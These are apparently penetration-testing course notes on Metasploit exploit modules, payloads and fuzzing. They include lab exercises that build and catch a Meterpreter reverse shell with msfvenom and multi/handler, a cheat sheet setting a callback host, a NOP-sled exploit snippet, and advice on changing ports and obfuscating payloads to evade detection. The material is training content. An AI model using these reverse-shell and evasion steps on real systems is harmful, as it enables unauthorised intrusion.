
## Understanding auxiliary modules and their categories

You discovered the four main categories of auxiliary modules and their specific functions in penetration testing:

- **Scanners** – Perform active information gathering across networks and systems, including port scanning, service discovery, and version detection
    
- **Fuzzers** – Test how applications respond to malformed or unexpected input to uncover hidden vulnerabilities and expose memory issues
    
- **Sniffers** – Monitor and analyze network traffic without generating new activity, observing existing communication, and capturing unencrypted data
    
- **Spoofers** – Simulate devices, servers, or services to manipulate communication, intercept traffic, and redirect data flows in controlled tests
    

## Real-world applications and case studies

You examined practical applications through real-world scenarios that demonstrate the value of auxiliary modules:

- How auxiliary modules help detect outdated SMB versions safely to identify vulnerabilities like EternalBlue without breaching systems
    
- The 2024 Qualys case study, where auxiliary scanning tools identified a vulnerable Microsoft Exchange server susceptible to Proxy Shell attacks before any exploitation occurred
    
- How passive scanning and enumeration confirmed outdated patch levels, enabling teams to escalate and remediate issues without system compromise
    

## Writing custom Metasploit exploits

You explored the fundamentals of creating custom exploits in Ruby, understanding the standardized module structure that ensures readability and extensibility:

- **Exploit definition blocks** – Provide metadata, including module name, author information, descriptions, and CVE references
    
- **Payload compatibility** – Specify supported payload types and size limitations for proper execution
    
- **Target definitions** – Outline compatible systems, versions, and software configurations
    
- **Exploit logic** – Define the vulnerability triggering process, including connection setup, payload construction, and session handling
    

You learned essential best practices for responsible exploit development, including testing in isolated lab environments, using virtualization for safe targets, implementing proper error handling, and avoiding unnecessary disk writes.

## Real-world exploitation methodology

You analyzed the methodical five-step process for professional exploitation testing, demonstrated through the Baron Samedit vulnerability (CVE-2021-3156):

- **Identify vulnerable versions** – Use enumeration tools, version checks, and vulnerability scanners to determine target susceptibility
    
- **Replicate in controlled environments** – Create sandbox environments using VirtualBox, VMware, or Docker containers for safe testing
    
- **Select appropriate Metasploit modules** – Locate matching modules or create custom ones, such as the exploit/linux/local/sudo_baron_samedit module
    
- **Execute exploits for elevated access** – Launch modules to gain root shells or elevated sessions through Meterpreter or standard shell payloads
    
- **Perform post-exploitation reconnaissance** – Confirm access levels, gather system intelligence, and document proof of successful exploitation


## Related tools and concepts

Meterpreter : 
	Functions as an advanced,memory-resident payload, Used in post-exploitation
Exploit module :
	 Contains code targeting vulnerabilities, Gains control over systems
Privilege escalations:
	 Gains higher-level access, Moves from user to root permissions
Sandbox testing:
	 Provides isolated environments, Enables safe exploit trails
Payload :
	 Delivers code after exploitation, Establishes communication or access


`Exercise`
1. `sudo adduser victim --disabled-password --gecos ""`
2. Generate reverse shell payload
	```sh
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o shell64.elf
chmod +x shell64.elf
sudo cp shell64.elf /home/victim/
sudo chown victim:victim /home/victim/shell64.elf

```
3. Start the Metasploit listener
```sh
msfconsole
### then configure the handler
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run
```

4. Trigger the payload
```sh
### Open new terminal
sudo -u victim /home/victim/shell64.elf
### Watch the first terminal for output
```
5. Interact with the session
```sh
### Back in the metasploit console, inside Meterpreter, run the follwing commands
getuid
sysinfo
pwd
```
6. Cleanup
```sh
sudo rm /home/victim/shell64.elf
sudo rm /home/victim/shell64.elf
```

--------------------------
# Exploit Development

### Locating and exploring exploit modules

Metasploit stores exploit modules in a structured file hierarchy, making locating specific exploits straightforward. For example, you can find the vsftpd_234_backdoor exploit at:

`/usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb`

To begin exploring an exploit, navigate to its directory using Linux shell commands. Open the file with a text editor like nano, vim, or gedit to inspect the Ruby code directly. Review the module metadata at the top of the file, which contains the name, description, associated CVE (like CVE-2011-2523), and target platforms. Then, identify the run method, which contains the core logic that is executed when you launch the exploit.

Understanding this structure proves essential for effective modifications. Never alter code without first comprehending what it does. Thoughtless changes lead to failed tests or unintended system impacts.

### Analyzing exploit logic

Every Metasploit exploit follows a logical sequence. It establishes a connection to the target system, delivers a trigger that activates vulnerability, and then creates or awaits a command shell or other access mechanism.

The vsftpd_234_backdoor module creates a TCP socket to connect to the vulnerable FTP server. It parses the FTP banner to confirm it's interacting with the vulnerable vsftpd version. The module then sends a specially crafted username containing the “:)” sequence that triggers the backdoor. Finally, it attempts to connect to the backdoor that the vulnerable server opens on port 6200.

This understanding allows you to customize where and how the shell connects back to your system, especially when default ports get blocked by firewalls or intrusion detection systems flag the standard behavior patterns.

### Modifying payload and port settings

One common evasion strategy involves modifying the payload type or communication ports. If the default port (6200 in this example) gets blocked or the standard shell type triggers detection, you can modify the module to use alternatives.

You might switch to a staged payload like `linux/x86/meterpreter/reverse_tcp`, which provides more powerful post-exploitation capabilities. You could also change the listening port to something less commonly monitored, such as port 4444 or 2222.

### Example: Metasploit configuration

Within Metasploit, you configure these changes with commands like:

- `set PAYLOAD linux/x86/meterpreter/reverse_tcp` 
- `set LPORT 4444`

Meterpreter provides significant advantages over standard shells, including migrating between processes, executing commands from memory rather than disk, and employing various stealth techniques.

### Reloading and testing modified exploits

After editing an exploit's Ruby file, you must reload the module within Metasploit by typing:

`reload_all`

This command reinitializes all modules without restarting the Metasploit Framework. Skipping this step causes the framework to continue using the original, unmodified version.

Professional penetration testers typically maintain multiple test environments using virtualization tools like VirtualBox or Proxmox. These sandboxed environments allow validating modified exploits safely before deploying them against authorized target systems.

### Assessing success and failure

Not every exploit works on the first try. Red teamers must learn to interpret signs of success or failure.

|Observation|Outcome|
|---|---|
|Shell opens on port 4444|Success|
|Meterpreter session established|Success|
|Shell closes immediately|Likely blocked or unstable shell|
|No response from the target|Target may be patched or offline|

Stable sessions and prompt feedback often mean success, but ethical hackers should review logs and correlate system behavior to confirm exploitation without causing impact.

## Real-world example: Exploit modification in the wild

Security researchers analyzing the 2022 LilithBot malware campaign discovered that attackers had modified public FTP exploits in several ways. They implemented randomized port numbers to avoid pattern-based detection, delivered payloads through custom protocol wrappers that standard security tools didn't recognize, and evaded detection by disabling typical connection banners and encrypting their payload traffic.

These adaptations allowed the malware to spread through poorly segmented networks while avoiding endpoint detection and response (EDR) tools for several weeks.

## Advanced tactics for red teams

Modifying exploits doesn't mean breaking systems recklessly. Ethical hackers adapt tools to match real-world conditions, mimic actual attacker behaviors, and provide valuable insights to defenders. More flexible and stealthy penetration testing methods deliver more value to client organizations.

After establishing initial access with a modified exploit, consider further enhancements like encrypting the payload, obfuscating the module code, or testing against different operating system distributions and versions. Each iteration develops your ability to think like a sophisticated adversary and ultimately helps organizations defend against one.

## Summary

- This reading explores how to modify existing Metasploit exploits to bypass updated defenses, using the vsftpd_234_backdoor module as a practical example.
- Understanding the internal structure of exploit modules, including their metadata and run methods, forms the foundation for effective customization.
- Exploit modules follow a predictable flow of establishing connections, delivering payload triggers, and creating shell access to compromised systems.
- Modifying parameters like payload types and communication ports helps avoid detection by intrusion prevention systems and firewall rules.
- Testing modified exploits in sandboxed environments before real-world deployment reduces the risk of unintended consequences.
- Real-world attackers like those behind the LilithBot campaign regularly modify public exploits by randomizing ports and encrypting communications to evade detection.
- Ethical red teaming focuses on mimicking sophisticated adversaries to help organizations improve their defenses against evolving threats.
- Each modification cycle teaches security professionals to think offensively and defensively, building more effective cybersecurity practices.

## Fuzzing

### Definition and purpose of fuzzing

Fuzzing or fuzz testing is a highly effective, automated technique used by security professionals and vulnerability researchers to uncover software flaws. At its core, fuzzing involves bombarding a target application or system with massive volumes of unexpected, malformed, or random data. The goal is to see how the software reacts under stress, especially when fed inputs it doesn't expect.

The crashing or hanging of a program, memory leaks, or erratic behavior may indicate deeper vulnerabilities. These include **buffer overflows**, **null pointer dereferences**, or **logic flaws**, all of which can be exploited under suitable circumstances.

In simpler terms, fuzzing is like stress-testing the input-handling logic of software to make it break, and learning from how it breaks.

## Why fuzzing matters in security

Fuzzing has been central to the discovery of some of the most notorious vulnerabilities in history, including the infamous Heartbleed bug (CVE-2014-0160) in OpenSSL. This vulnerability, which allowed attackers to read sensitive memory contents, was found through protocol fuzzing. This type of fuzzing is focused on how applications process structured data (Transport Layer Security -TLS)/Secure Sockets Layer - SSL packets).

Why is it important?

- Fuzzing often uncovers **zero-day vulnerabilities**, bugs that were previously unknown and unpatched.
- It is scalable and **automatable**, making it ideal for large applications and regression testing.
- Modern fuzzers use advanced techniques such as **code coverage analysis**, **instrumentation**, and **genetic algorithms** to improve their reach and effectiveness.

Fuzzing is especially valuable in pre-deployment security testing, continuous integration pipelines, and red team research.

## Types of fuzzing

Fuzzing is not a one-size-fits-all approach. Depending on the use case and complexity of the target, security teams choose between several types of fuzzing. Each type varies in intelligence, control, and coverage.

#### 1. Dumb fuzzing

**Description:**  
This is the most basic form of fuzzing. It sends purely random data to the target with no awareness of the input format, structure, or application logic.

- **Pros:** Easy to implement, fast setup, useful for discovering basic flaws
- **Cons:**Low efficiency, possibility of missing complex vulnerabilities due to invalid input formats

**Common Tools:**

- **zzuf:** Mutates existing input data by flipping bits or introducing random changes
- **radamsa:** Generates fuzzed input based on sample data, used in scripting pipelines

**Use case:** Basic file fuzzing for image parsers or text-based applications

#### 2. Smart fuzzing (or generation-based fuzzing)

**Description:**

Smart fuzzing leverages knowledge about the structure or format of expected input. It creates test cases that are syntactically valid but semantically unexpected, which increases the chance of bypassing validation layers and reaching deeper logic flaws.

- **Pros:** More efficient and targeted, often uncovers deeper bugs
- **Cons:** Requires format specifications or grammar definitions (for example, XML schemas, file format specs)

**Common tools:**

- **Peach fuzzer:** Advanced fuzzing platform supporting XML, file, and protocol fuzzing with schema definition
- **AFL (American fuzzy lop):** Instrumentation-based fuzzer that uses code coverage feedback to guide input mutation
- **boofuzz:** Python-based successor to Sulley; ideal for network and protocol fuzzing with custom scripts

**Use case:** Fuzzing custom input parsers, binary file readers, or proprietary protocols

#### 3. Protocol fuzzing

**Description:**  
Protocol fuzzing targets the way systems communicate, especially over network protocols such as FTP (File Transfer Protocol), HTTP (Hypertext Transfer Protocol), SMTP (Simple Mail Transfer Protocol), or even proprietary industrial control protocols. It's commonly used in testing network services, embedded devices, and IoT (Internet of Things) platforms.

- **Pros:** Helps identify vulnerabilities in communication stacks
- **Cons:** May require deeper protocol knowledge and traffic captures (for example, Wireshark PCAPs)

**Common tools:**

- **SPIKE:** A pioneering tool for fuzzing TCP/IP services and analyzing responses
- **Sulley:** Framework for crafting complex protocol test cases and monitoring stateful communications

**Use case:** Testing whether a web server crashes when receiving an invalid HTTP header or a malformed request body

## Common indicators of vulnerabilities during fuzzing

When fuzzing, one doesn't expect normal output. Instead, testers look for signs that something went wrong. These crash indicators are often the first clue that deeper security issues exist.

#### Common crash indicators:

- **Segmentation fault (Segfault):** Occurs when the application tries to read or write to unauthorized memory. It is a hallmark of pointer misuse or buffer overflows.
- **Buffer overflow:** Triggered when more data is written to a buffer than it can hold, allowing data to overwrite adjacent memory. This can potentially be exploited for arbitrary code execution.
- **Memory leaks:** Caused when the application allocates memory and fails to release it. Over time, this leads to performance degradation and can be used in denial-of-service scenarios.
- **Application hangs or reboots:** If a fuzzed input causes an app to freeze or restart, it may have hit an unhandled exception or crashed an internal service. Persistent hangs suggest a fault in the exception handling logic.

**Note:** Advanced fuzzers often integrate with crash triage tools like GDB (GNU debugger), Valgrind, or ASAN to capture stack traces and log details for analysis.


## Exercise

1. Setup the vulneable HTTP service
This step prepares a Python-based HTTP server running under a simulated low-privilege user. The server mimics a vulnerable service target.
```sh
sudo adduser victim --disabled-password --gecos ""
sudo mkdir -p /home/victim
```
```sh
sudo tee /home/victim/vuln_http.py > /dev/null << 'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
class FuzzTestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"Received GET request: {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
server = HTTPServer(('127.0.0.1', 8080), FuzzTestHandler)
print("Starting HTTP server on port 8080...")
server.serve_forever()
EOF
```

```sh
sudo chmod +x /home/victim/vuln_http.py
sudo chown victim:victim /home/victim/vuln_http.py
```
In new terminal
```sh
sudo ls
sudo -u victim python3 /home/victim/vuln_http.py &
```
2. Launch Metasploit and fuzz the server
use metasploit to simulate fuzzing the HTTP server by sending malformed data
```sh
msfconsole
```
Use the Http GET URI string fuzzer module:
```sh
use auxiliary/fuzzers/http/http_get_uri_strings
set RHOSTS 127.0.0.1
set RPORT 8080
run
```
3. Observe and document behavior
Monitor system output in both terminals:

- **In the victim's terminal,** look for printouts like `Received GET request: /<long string>` or any server-side errors like:

```sh
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
BrokenPipeError: [Errno 32] Broken pipe
```

- **In the Metasploit terminal,** watch for `[+]`, `[*]`, or crash indicators after sending malformed payloads.
```sh
[*] 127.0.0.1:8080 - Fuzzing with iteration 22700 using fuzzer_string_uris_giant
[*] 127.0.0.1:8080 - Fuzzing with iteration 22800 using fuzzer_string_uris_giant
[*] 127.0.0.1:8080 - Fuzzing with iteration 22900 using fuzzer_string_uris_giant

```
4. Challenge task - Modify the fuzzer settings
	1. Set RPORT to another available port (if 8080 is blocked).
	2. Use the set VHOST option to simulate a named host.
	3. Add additional fuzzing modules to compare results (e.g., http_get_uri_strings).
5. Cleanup the Environment
Terminate python Http server adn remove test files
```sh
sudo pkill -f vuln_http.py
sudo deluser --remove-home victim
```

## Exploit development is both an art and a science

At its core, exploit development is a fusion of creative problem-solving and deep technical skill. It requires an understanding of:

- **Low-level system behavior**: For example, memory allocation, register control, and syscall execution.
    
- **Software vulnerabilities**: For example, buffer overflows, use-after-free bugs, and logic flaws.
    
- **Payload design**: For example, reverse shells, staged command execution, etc.
    
- **Defensive countermeasures**: For example, ASLR, DEP, stack canaries, etc.
    

But it also requires adaptability, intuition, and a bit of reverse-engineering finesse to bypass defenses or customize existing techniques. The art lies in recognizing the unique behavior of each target environment and knowing how to pivot when standard payloads or modules don't work as expected.

Example: A buffer overflow that works on one Linux distribution might crash harmlessly on another due to a slightly different memory layout. A skilled developer knows how to troubleshoot and adjust accordingly.

## **Real-world attackers modify and adapt exploits**

Sophisticated adversaries rarely rely on unmodified exploits they find online. They often:

• Recompile or repackage payloads to avoid antivirus detection.

• Modify buffer sizes or offsets to account for memory layout differences.

• Chain multiple vulnerabilities (e.g., info disclosure → privilege escalation).

• Integrate exploits into custom delivery mechanisms like phishing, drive-by downloads, or USB-based attacks.

This behavior isn't limited to criminal actors — red teamers and penetration testers mirror these methods in authorized assessments to simulate real threat scenarios. As such, learning to adapt and repurpose existing exploits is a critical skill in offensive security.

Insight: The ability to tweak a Metasploit module or write a PoC script in Python can make the difference between a successful test and a missed opportunity to identify a real risk.

## **Fuzzing helps discover vulnerabilities before attackers do**

Fuzzing has emerged as one of the most effective techniques for proactive vulnerability discovery. By feeding applications with large volumes of structured or random inputs, fuzzing tools can:

- Trigger unexpected crashes
    
- Identify memory handling flaws
    
- Reveal logic issues in parsers, protocol handlers, or input validators
    

Security-conscious development teams now use fuzz testing as part of their CI/CD pipelines, aiming to catch bugs early and reduce downstream risk.

Note: Effective fuzzing combines intelligent input generation (smart fuzzing) with automated monitoring to quickly isolate and analyze anomalies.

_Example tools_:

- **Boofuzz**: Python-based fuzzing framework
    
- **AFL++ or American Fuzzy Lop**: Code coverage-guided fuzzer
    
- **libFuzzer**: In-process, LLVM-based fuzzing engine
    

Tools Like Boofuzz, GDB, and Metasploit enable complete testing workflows.

Each tool introduced in this module plays a vital role in the exploit development process:
#tools 

|Tool|Primary Role|
|---|---|
|**boofuzz**|Fuzzing (input mutation and protocol testing)|
|**gdb**|Debugging (memory analysis, crash diagnostics)|
|**Metasploit**|Exploitation (module deployment, payload testing)|

Together, they support full vulnerability research and exploitation workflow, from bug discovery to validation and reporting.

Pro Tip: Use boofuzz to identify a crash, gdb to trace it, and Metasploit to build a working exploit.

## **Example wrap-up insight: Real-world relevance**

In 2023, researchers used fuzzing tools to uncover critical vulnerabilities in widely used platforms like Microsoft Teams and Discord. Specifically, flaws were found in their embedded media parsers — the components responsible for decoding and rendering audio/video messages.

These flaws were triggered by malformed media files that caused the applications to crash or behave unpredictably. In some cases, the vulnerabilities could be used for remote code execution simply by sending a malicious image or audio clip to a target user.

These findings highlight the growing attack surface in modern collaboration tools and the importance of fuzzing non-traditional input types, such as:

- Multimedia formats (JPEG, MP3, MP4)
    
- Document formats (PDF, DOCX)
    
- Embedded browser-based content (WebRTC, JavaScript)
    

Even seemingly benign software features — like auto-playing a GIF — can become a threat vector if not rigorously tested with fuzzing techniques.

**Glossary**

|Terms|Definition|
|---|---|
|**Auxiliary module**|A non-exploit module used for scanning, fuzzing, sniffing, and other tasks that do not involve payload execution.|
|**Command injection**|A vulnerability that allows an attacker to execute system commands by injecting input into a command interpreter.|
|**Encoder**|A module that modifies payloads to evade detection mechanisms, such as antivirus or intrusion prevention systems.|
|**Format string bug**|A flaw where unsanitized user input is passed to formatting functions, which may lead to memory leakage or execution control.|
|**Fuzzing**|The process of inputting unexpected or random data into a program to identify potential crashes or vulnerabilities.|
|**Meterpreter**|A powerful in-memory payload offering post-exploitation functionality, such as file browsing, screenshot capture, and keylogging.|
|**Post module**|Modules used after exploitation for privilege escalation, credential dumping, or maintaining access.|
|**Proof of concept**|A minimal example or input that triggers vulnerability and confirms exploitability without delivering a payload.|
|**Root cause analysis**|The process of identifying the exact condition or code that enables a vulnerability, used to understand how it can be exploited.|
|**Stack-based buffer overflow**|A vulnerability where excessive input overwrites memory on the call stack, allowing attackers to redirect program execution.|
|**Use-after-free**|A vulnerability that occurs when memory is referenced after it has been freed, potentially leading to code execution.|

This cheat sheet summarizes key commands and concepts for developing, modifying, and testing exploits in Metasploit and conducting fuzzing to identify vulnerabilities. It supports red teamers, bug bounty hunters, and learners working in safe environments.

|Objective|Command/concept|Example usage|Explanation|
|---|---|---|---|
|**Locate Metasploit exploits**|1. `search <term>`|1. `search vsftpd`|Finds existing Metasploit modules by name, common vulnerabilities and exposures (CVEs), or service to inspect or reuse them|
|**Open Metasploit exploit source**|Navigate to path and open file|1. `nano /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb`|Examine or modify Ruby-based exploit modules|
|**Reload changed modules**|1. `reload_all`|1. `reload_all`|Refreshes Metasploit\'s module cache after editing exploit files|
|**Set payload**|1. `set PAYLOAD <payload>`|1. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`|Assigns a compatible payload for the target system|
|**Set listening port**|1. `set LPORT <port>`|1. `set LPORT 4444`|Defines the attacker\'s listening port to receive a reverse shell|
|**Set attacker IP**|1. `set LHOST <ip>`|1. `set LHOST 192.168.1.10`|Sets your machine\'s IP address to receive the callback|
|**Launch modified exploit**|1. `run`<br><br>          <br><br>        <br><br>1. `exploit`|1. `exploit`|Executes the exploit using modified logic or settings|
|**Observe crash behavior**|1. `dmesg`<br><br>          <br><br>        <br><br>1. `gdb`<br><br>          <br><br>        <br><br>1. `ASAN`|1. `dmesg \| tail`|Use logs or debuggers to detect memory violations or faults post-exploitation|
|**Fuzz a service (Boofuzz)**|Python + session.fuzz()|1. `session.fuzz() in custom script`|Initiates fuzzing with malformed inputs to uncover vulnerabilities|
|**Create proof of concept**|Minimal script|1. `sock.put(malformed_input)`|Validates the vulnerability without delivering a payload|
|**Write a basic custom exploit**|Ruby exploit block|1. `See the example, \"Basic exploit method in Ruby\" below`|Follow Metasploit\'s structure: connect, payload, handler, disconnect|
|**Bypass blocked ports**|1. `set LPORT`|1. `set LPORT 2222`|Change communication ports if standard ones (for example, 4444) are monitored|
|**Use AFL/libFuzzer**|Fuzzer integration|1. `afl-fuzz -i input -o output ./target`|Run instrumentation-based fuzzers to guide fuzzing via code coverage|

  

## Example: Basic exploit method in Ruby

This sends a no-operation () sled and payload to the target. It is the foundation for writing a stack-based buffer overflow exploit in Metasploit.
```ruby
def exploit 
  connect 
  buffer = make_nops(200) + payload.encoded 
  sock.put(buffer) 
  handler 
  disconnect 
end 
```

## Crash indicators in fuzzing

- Segfault: Unauthorized memory access
- Buffer overflow: Overwriting adjacent memory
- Memory leak: Allocated memory not released
- Hang/Reboot: Unhandled exception or fatal error

## Key tools
#tools 

|Tool|Use|
|---|---|
|**Metasploit**|Exploit automation and payload delivery|
|**GDB + Pwndbg**|Debugging and crash analysis|
|**Radare2/Ghidra**|Reverse engineering|
|**Boofuzz/SPIKE/Peach**|Smart fuzzing frameworks|
|**Pwntools**|Exploit scripting in Python|
|**msfvenom**|Payload generation|

